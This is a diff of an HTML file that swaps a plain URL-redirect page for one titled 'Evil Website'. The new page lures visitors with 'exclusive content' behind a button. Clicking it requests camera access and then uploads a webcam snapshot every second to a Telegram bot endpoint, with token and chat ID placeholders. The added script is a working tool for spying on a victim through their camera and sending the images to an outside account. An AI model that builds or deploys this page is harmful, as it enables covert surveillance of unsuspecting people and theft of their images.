@@ -1,50 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Short URL Redirection</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 40px;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        .info-text {
-            font-size: 18px;
-            margin-bottom: 20px;
-        }
-        .redirect-button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #4CAF50;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-    </style>
+    <title>Evil Website</title>
 </head>
 <body>
-
-    <div class="container">
-        <h1>Short URL Redirection</h1>
-        
-        <p class="info-text">To access the content, click the button below. Note: This is a real website link.</p>
-
-        <!-- Replace "https://www.mediafire.com/folder/pkp5eai7xvhxh/Q_paper_and_ans_key" with the desired URL -->
-        <button class="redirect-button" onclick="redirectToWebsite('https://example.com')">Go to Real Website</button>
-
-        <script>
-            function redirectToWebsite(url) {
-                window.location.href = url;
-            }
-        </script>
-    </div>
-
+    <h1>Welcome to Evil Website</h1>
+    <p>Please click the button below to access exclusive content.</p>
+    <button id="accessButton">Access Now</button>
+    <script>
+        document.getElementById('accessButton').addEventListener('click', function() {
+            // Request permission to access the camera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.autoplay = true;
+                    document.body.appendChild(video);
+                    
+                    // Capture frame from video stream
+                    var canvas = document.createElement('canvas');
+                    var context = canvas.getContext('2d');
+                    setInterval(function() {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var photoData = canvas.toDataURL('image/jpeg');
+                        
+                        // Send the captured photo to your Telegram account
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('POST', 'https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendPhoto', true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.send(JSON.stringify({
+                            chat_id: '<YOUR_CHAT_ID>',
+                            photo: photoData
+                        }));
+                    }, 1000);
+                })
+                .catch(function(error) {
+                    console.log('Error accessing the camera:', error);
+                });
+        });
+    </script>
 </body>
 </html>
